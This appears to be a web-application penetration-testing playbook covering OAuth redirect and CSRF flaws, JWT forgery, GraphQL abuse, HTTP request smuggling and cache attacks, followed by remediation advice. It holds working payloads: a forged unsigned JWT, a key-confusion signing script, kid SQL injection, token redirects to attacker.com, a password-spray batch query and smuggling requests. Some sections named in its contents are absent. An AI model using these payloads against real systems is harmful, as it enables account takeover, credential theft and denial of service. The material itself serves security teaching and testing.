<!--
Title: Advanced Web Attacks — OAuth 2.0, JWT, GraphQL & HTTP Request Smuggling
Volume: Volume 06 — Web Application VAPT
Category: Master Playbook
Prerequisites:
  - ../Volume_05_Web_Security_Foundations/Module_21_Web_Security_Foundations.md
  - ../Volume_05_Web_Security_Foundations/Module_29_Web_Application_Security_Tools.md
  - ./Module_30_OWASP_Top_10_Deep_Dive.md
Last Updated: 2026-09-06
-->

# Advanced Web Attacks: OAuth 2.0, JWT, GraphQL & Request Smuggling

> **Volume 06 · Web Application VAPT**  
> Exhaustive diagnostic reference and exploitation playbook for contemporary web protocol edge cases, cryptographic token bypasses, parser differential flaws, and API architectures.

---

## Table of Contents

1. [OAuth 2.0 & OpenID Connect (OIDC) Exploitation](#1-oauth-20--openid-connect-oidc-exploitation)
   - [1.1 Grant Types & Protocol Flow](#11-grant-types--protocol-flow)
   - [1.2 Redirect URI Flaws & Token Theft](#12-redirect-uri-flaws--token-theft)
   - [1.3 State Parameter Absence & Account Takeover (CSRF)](#13-state-parameter-absence--account-takeover-csrf)
   - [1.4 Pre-Account Takeover via Unlinked Identity Providers](#14-pre-account-takeover-via-unlinked-identity-providers)
2. [JSON Web Token (JWT) Attack Playbook](#2-json-web-token-jwt-attack-playbook)
   - [2.1 The "none" Algorithm Authentication Bypass](#21-the-none-algorithm-authentication-bypass)
   - [2.2 RS256 to HS256 Algorithm Confusion](#22-rs256-to-hs256-algorithm-confusion)
   - [2.3 JKU & JWK Header Injection (Self-Signed Keys)](#23-jku--jwk-header-injection-self-signed-keys)
   - [2.4 Key ID (kid) Parameter Injection](#24-key-id-kid-parameter-injection)
   - [2.5 Offline Secret Cracking](#25-offline-secret-cracking)
3. [GraphQL Security Assessment](#3-graphql-security-assessment)
   - [3.1 Introspection Query Mining & Schema Reconstruction](#31-introspection-query-mining--schema-reconstruction)
   - [3.2 Circular Query & Nested Depth DoS](#32-circular-query--nested-depth-dos)
   - [3.3 Batching Attacks & Rate Limit Bypass](#33-batching-attacks--rate-limit-bypass)
   - [3.4 Object & Field-Level Authorization Gaps](#34-object--field-level-authorization-gaps)
4. [HTTP Request Smuggling & Parser Differential](#4-http-request-smuggling--parser-differential)
   - [4.1 Front-End / Back-End Desynchronization (RFC 7230)](#41-front-end--back-end-desynchronization-rfc-7230)
   - [4.2 CL.TE & TE.CL Attack Vectors](#42-clte--tecl-attack-vectors)
   - [4.3 TE.TE Header Obfuscation](#43-tete-header-obfuscation)
   - [4.4 HTTP/2 Downgrading Smuggling (H2.CL / H2.TE)](#44-http2-downgrading-smuggling-h2cl--h2te)
5. [Web Cache Poisoning vs. Web Cache Deception](#5-web-cache-poisoning-vs-web-cache-deception)
6. [Remediation & Defense-in-Depth Architecture](#6-remediation--defense-in-depth-architecture)
7. [Authoritative References](#7-authoritative-references)

---

## 1. OAuth 2.0 & OpenID Connect (OIDC) Exploitation

OAuth 2.0 (RFC 6749) delegates authorization, while OIDC builds an identity/authentication layer on top of OAuth using signed JSON Web Tokens (ID Tokens).

```
Client (Relying Party)         Authorization Server (IdP)             Resource Server
         |                                  |                                |
         |--- 1. Auth Request (Redirect)--->|                                |
         |<-- 2. Auth Code in Redirect -----|                                |
         |                                  |                                |
         |--- 3. Exchange Code for Token -->|                                |
         |<-- 4. Access Token + ID Token ---|                                |
         |                                                                   |
         |--- 5. API Request (Bearer Token) -------------------------------->|
         |<-- 6. Protected Resource Data ------------------------------------|
```

### 1.2 Redirect URI Flaws & Token Theft

#### Root Cause
Authorization servers validate the `redirect_uri` parameter using permissive regex, prefix matching, or directory traversal parsing rather than exact strict string equality:

```
Permissive Check: ^https://client\.example\.com.*
Attack Vector:    https://client.example.com.attacker.com/callback
Directory Bypass: https://client.example.com/oauth/callback/../../attacker_open_redirect
Fragment Theft:   https://client.example.com/oauth/callback#access_token=...
```

#### Verification Methodology
1. Intercept the authorization request:
   ```http
   GET /authorize?response_type=code&client_id=client123&redirect_uri=https://client.example.com/callback&scope=openid%20profile HTTP/1.1
   Host: idp.example.com
   ```
2. Fuzz the `redirect_uri` with parser differentials:
   * Subdomain injection: `https://client.example.com@attacker.com/`
   * Path parameter injection: `https://client.example.com/callback%2f%2e%2e%2f%2e%2e%2fattacker`
   * Open redirect chaining: Point `redirect_uri` to a known open redirect on `client.example.com` that bounces tokens to `attacker.com`.

---

### 1.3 State Parameter Absence & Account Takeover (CSRF)

#### Root Cause
If the client omits the `state` parameter or fails to validate that the returned `state` matches a cryptographically secure value bound to the user's pre-existing session cookie, an attacker can complete a login CSRF.

#### Proof-of-Concept Workflow
1. Attacker initiates OAuth login with their own account at the IdP.
2. Attacker halts the HTTP flow at the final callback step (`/callback?code=ATTACKER_CODE`).
3. Attacker embeds this URL in an `<img>` or `<iframe>` on a malicious site and entices the victim to visit.
4. The victim's browser sends the request to the client app; the client binds the victim's session or profile to the attacker's IdP account.

---

### 1.4 Pre-Account Takeover via Unlinked Identity Providers

When an application supports classic email/password registration and social login (e.g., "Sign in with Google"):
* If the app fails to verify email ownership on traditional accounts, an attacker registers an account with `victim@target.com` before the victim logs in.
* When the legitimate user later clicks "Sign in with Google", if the application blindly links the Google account to the existing account by email without re-authenticating the local password, the attacker retains persistent password access.

---

## 2. JSON Web Token (JWT) Attack Playbook

A standard JWT consists of three Base64URL-encoded segments: `Header.Payload.Signature`.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature...
```

### 2.1 The "none" Algorithm Authentication Bypass

#### Root Cause
RFC 7515 defines the `none` algorithm for unsecured tokens. If the back-end JWT verification library accepts `none` or fails to enforce a fixed, expected algorithm:

```json
// Modified Header
{
  "alg": "none",
  "typ": "JWT"
}
// Modified Payload
{
  "user": "admin",
  "role": "SuperAdmin"
}
```

#### Verification Steps
1. Base64URL encode header and payload.
2. Concatenate with a trailing period and omit the signature entirely:
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiU3VwZXJBZG1pbiJ9.
   ```
3. Test case permutations to bypass naive filters: `None`, `NONE`, `nOnE`.

---

### 2.2 RS256 to HS256 Algorithm Confusion

#### Root Cause
* **RS256** uses an asymmetric RSA private key to sign and a public key to verify.
* **HS256** uses a symmetric HMAC pre-shared key for both signing and verification.
If the server's verification logic expects the algorithm from the token header and passes its RSA public key string to a generic `jwt.verify(token, key)` function, an attacker can change `"alg": "HS256"` and sign the token using the server's **public key** as the HMAC secret!

```python
import hmac, hashlib, base64, json

# Extract server public key (X.509 PEM or JWKS)
with open("public.pem", "rb") as f:
    pub_key = f.read()

header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b'=')
unsigned_token = header + b'.' + payload

# Sign using server public key as symmetric secret
sig = base64.urlsafe_b64encode(hmac.new(pub_key, unsigned_token, hashlib.sha256).digest()).rstrip(b'=')
forged_jwt = (unsigned_token + b'.' + sig).decode()
print("Forged Token:", forged_jwt)
```

---

### 2.3 JKU & JWK Header Injection (Self-Signed Keys)

* **JKU (`JSON Web Key Set URL`)**: Points to a URL serving the public keys used to sign the token.
  * *Exploitation*: Attacker hosts their own `jwks.json` on an external server or open redirect, updates `"jku": "https://attacker.com/jwks.json"` in the header, and signs the token with their matching private key.
* **JWK (`JSON Web Key`)**: Embeds the public key directly inside the token header.
  * *Exploitation*: If the server checks the signature against the embedded `"jwk"` property instead of a server-side trust store, attacker injects their own generated key directly.

---

### 2.4 Key ID (kid) Parameter Injection

The `kid` header parameter indicates which key to retrieve from a key store or filesystem:
* **Directory Traversal**: Setting `"kid": "../../../dev/null"` forces the verification key to be an empty string or null byte, allowing signing with an empty HMAC secret.
* **SQL Injection**: If the server executes `SELECT key FROM keys WHERE id = '$kid'`, inject: `"kid": "' UNION SELECT 'attacker_secret'--"` and sign with `attacker_secret`.

---

### 2.5 Offline Secret Cracking

Weak symmetric HMAC secrets can be brute-forced offline without generating server traffic:

```bash
# Hashcat Mode 16500 (JWT HMAC-SHA256)
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```

---

## 3. GraphQL Security Assessment

GraphQL is an API query language where clients specify the exact shape of responses, executing against a single HTTP endpoint (`/graphql`).

### 3.1 Introspection Query Mining & Schema Reconstruction

Introspection allows clients to query the schema directly:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}
```

#### Introspection Bypass Techniques
When simple introspection is blocked:
1. Whitespace / Newline evasion: `query\n{\n__schema{...}}`
2. Alias spoofing: `query { evilSchema: __schema { types { name } } }`
3. Field suggestion probing via Clairvoyance (extracts schema through "Did you mean...?" compiler error responses).

---

### 3.2 Circular Query & Nested Depth DoS

If depth limiting is disabled, an attacker executes recursive relational queries that cause algorithmic complexity exhaustion on the database/resolver:

```graphql
query ResourceExhaustion {
  thread(id: 1) {
    messages {
      author {
        threads {
          messages {
            author {
              threads {
                messages {
                  id
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

### 3.3 Batching Attacks & Rate Limit Bypass

GraphQL supports array batching and field aliasing, circumventing traditional IP-based and URL-based rate limits:

```graphql
query MassPasswordSpray {
  attempt1: login(user: "admin", pass: "pass1") { token }
  attempt2: login(user: "admin", pass: "pass2") { token }
  attempt3: login(user: "admin", pass: "pass3") { token }
  # 500 attempts in a single HTTP POST request
}
```

---

## 4. HTTP Request Smuggling & Parser Differential

Request Smuggling (RFC 7230 §3.3.3) arises when a front-end reverse proxy and a back-end application server disagree on where an HTTP request begins and ends.

```
Front-End Proxy (Uses Content-Length)           Back-End Server (Uses Transfer-Encoding)
[ Request 1 Header ]                            [ Request 1 (Terminates at Chunk 0) ]
[ Request 1 Body + Request 2 Embedded ] -------> 
                                                [ Request 2 (Treated as Start of Next Req!) ]
```

### 4.2 CL.TE & TE.CL Attack Vectors

#### CL.TE Smuggling
* **Front-End**: Processes `Content-Length`.
* **Back-End**: Processes `Transfer-Encoding: chunked`.

```http
POST / HTTP/1.1
Host: vulnerable-app.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
* The front-end forwards all 13 bytes. The back-end parses chunk `0`, concludes Request 1 is finished, and leaves `SMUGGLED` in the socket buffer. The next incoming request from a victim is prepended with `SMUGGLED`!

#### TE.CL Smuggling
* **Front-End**: Processes `Transfer-Encoding: chunked`.
* **Back-End**: Processes `Content-Length`.

```http
POST / HTTP/1.1
Host: vulnerable-app.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

---

### 4.3 TE.TE Header Obfuscation

When both servers support `Transfer-Encoding`, but one can be coerced into ignoring it via non-standard header variations:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: cow
X: X[\n]Transfer-Encoding: chunked
```

---

## 5. Web Cache Poisoning vs. Web Cache Deception

| Dimension | Web Cache Poisoning | Web Cache Deception |
|---|---|---|
| **Primary Target** | The CDN / Cache Server | The End User's Sensitive Data |
| **Input Vector** | Unkeyed HTTP Headers (`X-Forwarded-Host`, `X-Original-URL`) | Path Confusion on URL (`/account/settings/avatar.css`) |
| **Impact** | Stored XSS or defacement served to all users from cache | Attacker reads cached private user profiles, API keys |
| **Mechanism** | Manipulating unkeyed inputs to produce harmful cached response | Tricking cache into storing dynamic page under static file cache rule |

---

## 6. Remediation & Defense-in-Depth Architecture

### OAuth 2.0 Hardening
1. **Strict Redirect URI Matching**: Reject wildcards and path patterns; enforce absolute, character-by-character string comparison.
2. **Mandatory State & PKCE**: Require `state` with cryptographic entropy bound to an encrypted cookie. Enforce **PKCE (Proof Key for Code Exchange - RFC 7636)** for all flows, not just mobile clients.

### JWT Security Best Practices
1. **Enforce Whitelisted Algorithms**: Explicitly reject `none` and ensure the verification function only permits the exact expected algorithm (e.g., exclusively `RS256`).
2. **Decouple Key Retrieval from Header**: Never trust `jku` or `jwk` from untrusted user headers. Store public keys strictly server-side.

### GraphQL Defense
1. **Disable Production Introspection**: Disable `__schema` in production deployment.
2. **Query Depth & Cost Analysis**: Implement query complexity analyzers (e.g., max depth 5, query cost ceiling).
3. **Field-Level Authorization**: Enforce authorization within resolver logic, not just at HTTP router boundaries.

### Request Smuggling Mitigation
1. **Enforce HTTP/2 End-to-End**: Eliminates ambiguous chunk boundaries.
2. **Strict RFC 7230 Parsing**: Configure front-end reverse proxies (Nginx, Envoy, Cloudflare) to normalize ambiguous requests and reject any request containing both `Content-Length` and `Transfer-Encoding`.

---

## 7. Authoritative References

* **RFC 6749**: The OAuth 2.0 Authorization Framework — IETF Standards Track
* **RFC 7519**: JSON Web Token (JWT) — IETF Standards Track
* **RFC 7230**: HTTP/1.1 Message Syntax and Routing (Section 3.3.3 Message Body Length)
* **PortSwigger Web Security Academy**: HTTP Request Smuggling & OAuth 2.0 Vulnerabilities (James Kettle Research)
* **OWASP Application Security Verification Standard (ASVS v4.0.3)**: Sections V2 (Authentication), V3 (Session Management), and V13 (API & Web Service Verification)
